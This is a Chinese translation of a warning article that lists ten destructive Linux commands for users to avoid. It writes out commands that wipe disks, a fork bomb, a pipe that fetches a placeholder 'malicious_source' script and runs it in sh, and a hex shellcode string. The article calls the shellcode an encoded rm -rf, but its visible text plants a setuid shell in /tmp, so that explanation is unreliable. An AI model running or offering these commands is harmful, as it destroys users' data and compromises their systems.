[#]: subject: "10 Destructive Linux Commands You Should Never Run"
[#]: via: "https://itsfoss.com/dangerous-linux-commands/"
[#]: author: "Abhishek Prakash https://itsfoss.com/"
[#]: collector: "lkxed"
[#]: translator: "wxy"
[#]: reviewer: "wxy"
[#]: publisher: "wxy"
[#]: url: "https://linux.cn/article-15022-1.html"

10 大可以摧毁你的 Linux 的命令
======

![](https://img.linux.net.cn/data/attachment/album/202209/12/184637rc8znomk1ok7o2wx.jpg)

什么是最危险的 Linux 命令？

有人无数次问我这个问题，我一直避免回答，因为**没有一个明确的危险的 Linux 命令清单**。

你拥有的工具使你能够控制和修改你的操作系统的每一个方面。我不是想吓唬你，但如果你不熟悉这些命令和工具，你可以很容易地把你的系统摧毁。

想象一下家庭中的小孩子的情景。孩子有许多方法可以伤害自己。但这是否意味着不应允许孩子离开婴儿床？那会对她的成长造成损害。

这就是父母设定界限和引导孩子的地方。不要靠近火堆，不要把手指戳到电源插座上……随着孩子的成长和经验的积累，她可以把炉子打开，在壁炉里生火，插上电源线。

同样，如果你知道一些已知的风险命令，你可能会避免落入巨魔的陷阱，他们试图欺骗你运行命令，扰乱你的系统。

当你积累了经验，知道了这些命令和工具的含义和用法，用愚蠢和棘手的命令破坏你的系统的机会就会减少。

我的同事 Sreenath 收集了一些流行的危险 Linux 命令。让我们看看它们是如何干掉你的 Linux 系统的。

> **免责警告：如果你不清楚你在做什么，请勿尝试本文提及的这些命令，否则后果自负。**

### 1、rm -rf /*

这个可能是在各种社交媒体上盘旋的最臭名昭著的命令。你会经常发现巨魔们在各种讨论中提及这个。

`rm` 命令用来删除文件/目录。标志 `-r` 和 `-f` 表示递归地删除指定目录内的所有文件。现在，如果没有 root 权限，这个命令不会造成任何伤害。

运行 [sudo rm -rf /][1] 命令也不会产生任何问题，因为大多数发行版提供了一个故障安全选项。你需要指定 `--no-preserve-root` 才能实际运行它。

```
sudo rm -rf / --no-preserve-root
```

然而，一个更简单的版本可以是这样的：

```
sudo rm -rf /*
```

它将开始递归地删除根目录下的所有文件，在一段时间后，你的系统会冻结，并显示“删除文件错误”。一旦重新启动，你将被送到 **grub-rescue** 提示符下。

### 2、覆盖你的分区

如果你熟悉文件系统，你可能知道 `/dev/sda` 是什么。它（通常）是你的磁盘驱动器分区。`>` 操作符用于将其前面的命令的输出写到所提供的指定位置。

一旦你运行任何命令并把它写到 `/dev/sda`，比如说：

```
echo "Hello" > /dev/sda
```

这将用 `Hello` 字符串替换你的包含启动系统所需的所有数据的分区。

### 3、把所有的东西都移到黑洞

每个 Linux 系统内都有一个黑洞。而这个黑洞就是 `/dev/null`。

无论你把什么东西扔进这个区域都会永远丢失。而且，它在丢弃数据后会将写入过程报告为成功，这是其破坏性的主要原因。

```
mv /home/user/* /dev/null
```

[mv 命令][3] 用来移动或重命名文件/目录。在上面的命令中，你把家目录内的所有文件都移到了黑洞中。虽然根系统没有被破坏，但你所有的个人数据都会丢失。

### 4、格式化你的硬盘

[mkfs][4] 是一个命令行工具，用于格式化磁盘和分区。它是一个超级方便的工具，可以为安装的操作系统创建分区。但同样的命令也可以格式化你的硬盘。格式化你的驱动器意味着删除系统启动所需的所有文件。

```
mkfs.ext3 /dev/sda
```

这个命令完成了它的工作，而你最终得到了一个无法恢复的混乱的系统。

### 5、fork 炸弹

这个看起来很可爱的特殊字符和符号的随机组合，足以通过耗尽系统资源来冻结一个正在运行的系统。

```
:(){ :|:& };:
```

`&` - Shell 后台操作符。它通知 Shell 将命令放在后台。在这里，它定义了一个叫做 `:` 的函数，它调用自己两次，一次在前台，一次在后台。这个过程不断地重复执行，直到系统冻结。

顾名思义，它自己分叉，最终成为一个连锁炸弹，吃掉了所有的系统资源。你将被迫重启系统，这并不像本列表中的其他命令那样糟糕。

### 6、覆盖重要的配置文件

虽然这本身不是一个命令，但它更像是一个预防性的东西。

如上所述，`>` 操作符是用来向文件写入的。它丢弃文件中已经存在的东西，并将提供的新数据写入文件中。

```
command > config_filename
```

现在，如果你将一些重要的配置文件作为写数据的地方，它将被取代内容，留下一个损坏的系统。

### 7、用垃圾数据替换分区

`/dev/random` 是 Linux 中的一个命令，它可以创建垃圾数据。把它和 [dd 命令][5] 以及你的分区结合起来，你就得到了一个可以让你的分区着火的燃烧弹。

```
dd if=/dev/random of=/dev/sda
```

`dd` 命令被用作一个低级别的复制工具。这里，它从 `/dev/random` 中获取随机数据，并用这些垃圾替换 `/dev/sda` 分区。

一个类似的效果是通过以下方式获得的：

```
cat /dev/urandom > filename
```

这里，它从 `/dev/urandom`（LCTT 译注：在 Linux 上，`/dev/urandom` 现在和 `/dev/random` 的等价的 ）中获取垃圾数据并填入一个文件。如果不使用 `Ctrl + C` 终止，该文件会占据相当大的空间，这对低端系统来说可能是灾难性的。

### 8、将你的系统暴露给所有人

在 Linux 中，所有东西都是文件，每个 [文件都有一定的权限][6]。

你可以用 `ls -l` 查看权限。根文件系统是不允许其他没有权限的用户访问的。虽然这保证了系统的私密性和安全性，但你可以用一个命令颠覆这个系统。

```
chmod -R 777 /
```

上述命令将根分区上的所有文件暴露给所有人。这意味着每个使用该系统的人都有读、写和执行的权限。这对你的系统是不利的。

### 9、下载并运行恶意的内容

你如何在 Linux 中安装软件？你可以使用官方的软件包管理器或随时可以使用的软件包，如 Deb/RPM、Snap、Flatpak 等。

然而，有些软件是没有打包的，它们的开发者提供了下载和运行的 Shell 脚本。以 [Homebrew][7] 为例：

你下载一个 Shell 文件，然后以 root 身份运行它，在你的系统中安装一个软件。你看出问题了吗？

虽然它对 Homebrew 这样的官方软件有效，但在你像下面这样直接运行它之前，你应该仔细检查你所下载的 Shell 脚本的内容：

```
wget http://malicious_source -O- | sh
```

这样的命令会在你的系统中下载并运行恶意脚本，这可能会破坏你的系统的安全性。

### 10、伪装的命令

在 Linux 终端中，有许多方法可以运行命令。其中一种方式是十六进制编码的命令：

```
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```

虽然它看起来很花哨，但这是 `rm -rf` 命令的一个编码版本。它的效果与运行前面的命令相同。因此，在从互联网上复制和粘贴这些花哨的命令时，要小心谨慎。

### 总结

![pebkac][8]

有一个著名的计算机术语 PEBKAC：“<ruby>问题存在于键盘和椅子之间<rt>problem exists between keyboard and chair</rt></ruby>”。

因为归根结底，还是要靠用户（你）来保证你不会因为盲目地运行任何危险的命令而破坏系统。

> UNIX 的工作不是要阻止你搬起石头砸你自己的脚。如果你选择这样做，那么 UNIX 的工作就是以它所知道的最有效的方式将石头砸到脚上。

而这句话同样适用于 Linux。你可以完全控制你的操作系统。你选择做什么，完全取决于你。

我建议做这些事情以确保更安全的体验。

* 尝试并理解你将要运行的命令。
* 用 Timeshift 保持你的系统设置的备份
* 用 DejaDup 保持个人数据（主目录）的备份

正如我所说，没有固定的危险 Linux 命令清单。还有很多可以添加到这个列表中，而且根本没有尽头。

我希望这能给你一些提示，告诉你为了保持 Linux 的安全，你不应该做什么。如果你有建议，请在评论区告诉我。

--------------------------------------------------------------------------------

via: https://itsfoss.com/dangerous-linux-commands/

作者：[Abhishek Prakash][a]
选题：[lkxed][b]
译者：[wxy](https://github.com/wxy)
校对：[wxy](https://github.com/wxy)

本文由 [LCTT](https://github.com/LCTT/TranslateProject) 原创编译，[Linux中国](https://linux.cn/) 荣誉推出

[a]: https://itsfoss.com/
[b]: https://github.com/lkxed
[1]: https://itsfoss.com/sudo-rm-rf/
[2]: https://youtu.be/AiKPo14uVNU
[3]: https://linuxhandbook.com/mv-command/
[4]: https://linuxhandbook.com/mkfs-command/
[5]: https://linuxhandbook.com/dd-command/
[6]: https://linuxhandbook.com/linux-file-permissions/
[7]: https://itsfoss.com/homebrew-linux/
[8]: https://itsfoss.com/wp-content/uploads/2022/09/pebkac.jpg
